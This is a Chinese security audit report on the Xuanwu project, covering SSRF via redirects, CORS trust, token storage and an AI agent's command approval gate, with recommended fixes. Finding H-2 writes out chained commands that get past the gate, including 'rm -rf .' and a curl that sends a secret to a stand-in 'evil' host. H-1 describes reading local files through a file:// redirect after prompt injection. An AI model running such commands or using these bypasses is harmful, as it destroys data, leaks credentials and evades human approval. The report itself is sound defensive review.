# Xuanwu 代码审核报告（2026-08-25）

**审核方式**：两名独立审核代理并行调研 + 主代理对关键高危项抽查核实原文。
**范围**：`backend-ts/src`（http 层、安全、providers、runner、pi 工具）、`frontend/src/api`、`scripts/` 目录清单；基础结构以 README/package.json/tsconfig 为准。

---

## 结论概览

项目整体防御水平较高：SQL 全参数化、路径穿越防护、token 常量时间比较、HMAC 回调验签、审计脱敏、action 门控均有实现和测试。未发现可直接远程利用的致命漏洞。

但存在若干**中高危设计缺陷**，主要集中在：

1.  **AI 代理沙箱边界**：`url_fetch` 存在 SSRF（含 `file://` 重定向 oracle）、bash 例行操作正则可被 `&&` 绕过、agent 子进程继承完整控制面环境变量。
2.  **Web 网关链路**：CORS 信任伪造 `X-Forwarded-Host`、30s 代理超时作用于 SSE、SSE 异常路径泄漏订阅。
3.  **凭据与静态加密**：file secrets 把 master.key 与密文同目录存放、token 同时存 localStorage 与非 HttpOnly Cookie。
4.  **认证与配置加固**：`assertInternalCoreAddress` 实际只拒绝通配符地址、认证无失败限速、auth token 每次请求读盘。

建议按"高危 → 中危 → 低危"顺序分批修复，高危项在下一版本前完成。

---

## 高危

### H-1 `url_fetch` 存在 SSRF，重定向可绕过目标限制（含 `file://` 本地文件读取 oracle）

- **位置**：`backend-ts/src/pi/httpToolCall.ts:58-67`、`139-152`；`backend-ts/src/security/promptInjectionDefense.ts:91-99`
- **类别**：安全 / SSRF / 信息泄露
- **现状**：
  - `fetchWithRedirects` 在收到 `Location` 头后，解析新 URL 直接进入下一次 `fetch`，**不复查 scheme/目标**。
  - `normalizedUrl` 仅校验初始 URL 为 http/https。
  - `unsafeUrlEgressReason` 只拦截 URL userinfo 和敏感字符串，**没有** loopback/私有网段/链路本地地址（如 `169.254.169.254`）/重定向检查。
- **已实测**：Bun `fetch("file:///etc/hosts", {redirect:"manual"})` 返回 200 且含文件内容。因此 `http://attacker → Location: file:///...` 可被跟随。
- **影响**：模型被诱导（提示注入、恶意网页链接）时，可探测/读取本机与内网 HTTP 服务、云 metadata；`file://` 重定向提供文件存在/大小/sha256 oracle。
- **修复建议**：
  1. 每个重定向 hop 都重新走 `normalizedUrl` + `unsafeUrlEgressReason`。
  2. 增加 loopback、私有网段（RFC1918）、链路本地、`169.254.169.254` 等 IP 黑名单；DNS 解析后校验 IP，防 rebinding。
  3. 对 `file:`、`gopher:` 等非 http(s) scheme 直接拒绝。

### H-2 pi bash 工具"例行操作"正则未锚定命令结尾，可用 `&&` 链绕过审批门

- **位置**：`backend-ts/src/providers/pi/provider.ts:636-644`
- **类别**：安全 / 审批绕过
- **现状**：正则 `/^(?:git\s+(?:status|diff|show|log)(?:\s|$)|...` 只匹配前缀，不检查整条命令是否还有后续内容。
- **已实测**：`git log && rm -rf .`、`bun run build && curl http://evil -d @secret` 均被分类为 `routine`，在 `ask-every-side-effect` 模式下免确认放行。
- **影响**：模型可将任意副作用命令以"只读前缀 + `&&`"形式混入，绕过审批。
- **修复建议**：拆分命令后逐段校验；或要求整条命令仅匹配白名单子命令的纯只读参数子集，禁止 `&&`/`||`/`;`/管道/重定向。

---

## 中危

### M-1 CORS 网关信任可被"直连核心端口的本地客户端"伪造

- **位置**：`backend-ts/src/http/cors.ts:5-9`
- **类别**：安全 / CORS 设计缺陷
- **现状**：`trustGateway = isLocalHostHeader(directHost)`；只要 `Host` 是 localhost，就无条件信任 `x-forwarded-host`/`x-forwarded-proto`。任何能直连核心端口的本机进程伪造这两个头，即可让任意 Origin 通过校验并获得 CORS 头。
- **影响**：当前因 `corsHeaders` 未带 `Access-Control-Allow-Credentials`、cookie 为 `SameSite=Lax`，远程浏览器攻击面有限；但校验语义已被破坏，未来启用 credentials 或结合"任意 localhost origin 一律放行"分支后，将升级为完整跨源数据窃取。
- **修复建议**：`x-forwarded-*` 只信任来自已知网关地址（校验对端 socket 地址或网关与核心间加共享 secret 头）；直连请求一律忽略转发头。

### M-2 认证 token 同时存 localStorage 与非 HttpOnly Cookie，XSS 即完全失守

- **位置**：`frontend/src/api/authToken.js:84-90`；`backend-ts/src/http/auth.ts`（`requestCookieToken`）
- **类别**：安全 / 凭据存储
- **现状**：token 写入 `localStorage` 且写入 `document.cookie`（`SameSite=Lax`、无 `Secure`、无 `HttpOnly`、有效期 1 年），后端同时接受该 Cookie 认证。
- **影响**：任意 XSS 可直接读走 token；1 年有效期放大泄露窗口。`SameSite=Lax` 不阻止跨站顶级 GET 导航携带 Cookie，若存在产生副作用的 GET 端点则构成 CSRF 面。
- **修复建议**：服务端下发 `HttpOnly; Secure; SameSite=Strict` Cookie + CSRF token，或取消 Cookie 认证仅留 `Authorization` 头；缩短有效期。

### M-3 Web 网关 30s 代理超时作用于 SSE 整个响应体，长连接被周期性切断

- **位置**：`backend-ts/src/http/webGateway.ts:57-79`；`backend-ts/src/config/webGateway.ts:4`（`DEFAULT_PROXY_TIMEOUT_MS = 30_000`）
- **类别**：资源 / 接口契约
- **现状**：`proxyToCore` 把 `AbortSignal.any([request.signal, timeout.signal])` 绑定到上游 fetch；`await fetch` 在响应头到达后即返回，但 abort 信号仍会取消 body 流。所有经过网关的 SSE（`/api/events`、`/api/pi/conversations/:id/messages`）最多存活 30s。
- **影响**：前端 `piConversationStream.js` 的 `onerror/onclose` 直接抛错不重试，表现为会话中途报"连接已中断，Xuanwu 可能仍在后台运行"——前后端对"网关会掐 SSE"没有契约共识。
- **修复建议**：对 `content-type: text/event-stream` 的响应在头到达后解除超时，或单独配置流式超时。

### M-4 SSE heartbeat/enqueue 异常路径可能泄漏订阅与定时器

- **位置**：`backend-ts/src/http/events.ts:18-46`
- **类别**：并发 / 资源泄漏
- **现状**：`streamWriter` 的 `controller.enqueue` 未捕获异常。若客户端被中间层断开而 `cancel()` 未被触发，`enqueue` 抛出后 heartbeat `setInterval` 与 `subscription` 永不释放。
- **影响**：每个被异常断开的连接泄漏一个定时器 + 一个事件订阅。
- **修复建议**：`write` 内 try/catch，捕获后执行与 `cancel()` 相同的清理；确认 bus 侧 `subscription.close()` 能唤醒阻塞中的 `subscription.next()`。

### M-5 file secrets 把 master.key 与密文同目录存放，读路径不校验权限

- **位置**：`backend-ts/src/security/secrets/fileBackend.ts:17-19`、`:144-146`
- **类别**：安全 / 静态加密失效风险
- **现状**：`store.json` 与 `master.key` 同在 `stateDir/secrets/`；key 创建时设 0700，但读时不校验文件权限。
- **影响**：AES-256-GCM 的密钥与密文放在同一目录，只要该目录被整体备份/同步/迁移，加密即形同虚设。
- **修复建议**：key 放入独立存储（keychain/系统钥匙串）或至少与密文分目录并做权限校验与告警；文档中明确"复制 data 目录=泄漏全部 secret"。

### M-6 `assertInternalCoreAddress` 名为"必须内网/回环"，实际只拒绝通配符地址

- **位置**：`backend-ts/src/serverRole.ts:21-26`
- **类别**：安全 / 配置加固
- **现状**：`XUANWU_ADDR=192.168.1.100:3008`（core/agentic/all 角色）可通过检查；HTTP 无 TLS，绑定到局域网即意味 token 明文在网络上传输。
- **修复建议**：用 IP 解析校验必须是 loopback（`127.0.0.0/8`、`::1`、`localhost`）；非回环时拒绝 core/agentic 角色或显著告警。

### M-7 agent 子进程继承完整父环境，`XUANWU_*` 控制面密钥直达 AI 代理

- **位置**：`backend-ts/src/providers/claude/auth.ts:44-54`；`backend-ts/src/providers/codex/jsonRpc.ts:108`
- **类别**：安全 / 凭据隔离
- **现状**：`claudeProcessEnvironment` 以 `{...parentEnvironment}` 全量继承；codex 侧 `env: managedExecutionEnvironment({...Bun.env, ...})`。
- **影响**：`XUANWU_AUTH_TOKEN`、`XUANWU_CLAUDE_API_KEY`、Feishu/Telegram 密钥、webhook 签名密钥等（若以 env 配置）会进入 AI 子进程环境；agent 只需 `printenv` 即可读取控制面凭据。
- **修复建议**：为 agent 子进程做环境白名单/黑名单过滤，剥离 `XUANWU_*` 与连接器密钥后再注入。

---

## 低危

| # | 位置 | 类别 | 描述 | 修复建议 |
|---|------|------|------|----------|
| L-1 | `backend-ts/src/http/piActionDispatch.ts:234-238` | 健壮性 / fail-open | `assistant.tool.call` 的 permission 解析在缺失/非法时默认返回 `"dangerous"` | 非法/缺失权限一律 fail-closed，不允许默认提权 |
| L-2 | `backend-ts/src/http/legacyCompatibilityApi.ts:233-235` | 安全 / 弱随机数 | `randomID()` 在 `crypto.randomUUID` 不可用时用 `Math.random()` 兜底 | 兜底改用 `crypto.getRandomValues` 或直接抛错 |
| L-3 | `backend-ts/src/http/auth.ts:40-42` | 安全 / 认证 fail-open | `requireBearerAuth` 在 token 为空串时对全部 `/api` 放行 | 改为 fail-closed（无 token 配置时 503/401），删除空串放行分支 |
| L-4 | `backend-ts/src/providers/codex/jsonRpc.ts:475-482` | 健壮性 | `splitCommand` 引号解析不完整，不支持引号内转义与空引号 | 改用成熟分词库或要求以 argv 数组形式配置 |
| L-5 | `backend-ts/src/http/server.ts:262-267` | 性能 | 每个 `/api` 请求都同步读一次 auth token 文件 | 缓存 token + 记录 mtime/内容变更检测，或 TTL 缓存 |
| L-6 | `backend-ts/src/http/server.ts`（`registerControlledBlockRoute`） | 安全 / DoS | 设置 `XUANWU_TEST_BLOCK_MS` 后，`/api/system/test/block` 用 `Bun.sleepSync` 阻塞事件循环 | 仅在显式测试模式/角色下注册 |
| L-7 | `frontend/src/api/base.js:43-45` | 错误处理 | 非 JSON 的 200 响应直接 `JSON.parse` 抛 `SyntaxError` | parse 失败转为 `ApiError` |
| L-8 | `frontend/src/api/base.js:5-22` | 接口契约 | GET 去重仅以 URL 为键，跨调用方共享 Promise，错误会同时命中所有等待者 | 限定去重白名单端点，或把影响响应的选项并入 key |
| L-9 | `backend-ts/src/http/auth.ts` | 安全 | 认证无失败限速；`constantTimeEqual` 长度短路泄露长度信息 | 增加 401 计数/临时封禁；token 缓存 + 文件变更时刷新 |
| L-10 | `backend-ts/src/http/staticWeb.ts` | 资源 | 静态文件 `readFileSync` 整读、无大小上限 | 改用 `Bun.file`/流式响应并限制上限 |
| L-11 | `backend-ts/src/runner/providerRuntime.ts` | 并发 | `eventSink.flush()` 用 `Promise.all` 等待所有对账完成，无超时 | 给 flush 加超时上限，或让对账失败/超时降级为异步补偿 |
| L-12 | `backend-ts/src/providers/codex/processLifecycle.ts` | 资源 / 子进程 | 进程组归属校验依赖 `ps` command 字符串精确匹配，长命令行可能被截断 | `ps -ww` 全宽输出，或以 `pgid+ppid` 链为主、command 仅作辅助校验 |

---

## 已确认安全的重点区域

- **SQL**：全参数化；标识符拼接仅存在于内部管理工具且用 `quoteIdentifier` 转义。
- **路径穿越**：静态文件（`staticWeb.ts` resolve+isInside）、系统日志（白名单+resolve 校验）均有防护。
- **回调鉴权**：飞书回调（时间戳 skew+常量时间比较）、webhook（HMAC+idempotency-key 去重+raw_payload_sha256 冲突检测）均扎实。
- **action 门控**：`assistant.tool.call`/`mcp.tool.call` 为 high-risk 需确认，payload permission 由 registry 注入而非模型自报。
- **进程执行**：无 `shell:true`，executable 有 `UNSAFE_EXECUTABLE_RE` 校验。
- **DB 安全**：`foreign_keys=on`、WAL、`query_only`（readonly 连接）。
- **敏感信息**：`data/`、`data-bun/` 已 `.gitignore` 覆盖，未发现真实密钥提交进 git。

---

## 修复优先级建议

| 批次 | 内容 | 目标 |
|------|------|------|
| P0 | H-1 SSRF、H-2 bash 审批绕过 | 下一版本前必须修复 |
| P1 | M-1 CORS、M-2 token 存储、M-7 环境变量隔离 | 2 周内 |
| P2 | M-3 SSE 超时、M-4 SSE 泄漏、M-5 secrets 存储、M-6 地址校验 | 1 个月内 |
| P3 | L-1 ~ L-12 | 随日常迭代清理 |

---

## 审核局限

- 未做端到端 SSRF/提示注入演示；`file://` 重定向行为已实测确认。
- 发现 M-7 的落地取决于部署时是否用 env 配置 `XUANWU_*`；若全部用文件+keychain 配置则影响有限。
- 未深入覆盖：`http/piConversationApi.ts`、`http/systemRestartApi.ts`、`http/feishuEventsApi.ts`（飞书签名校验）、`evidenceApi.ts` 文件读写路径、`security/secrets/keychainBackend.ts`、`scripts/*.sh`、数据库层 `db/`。
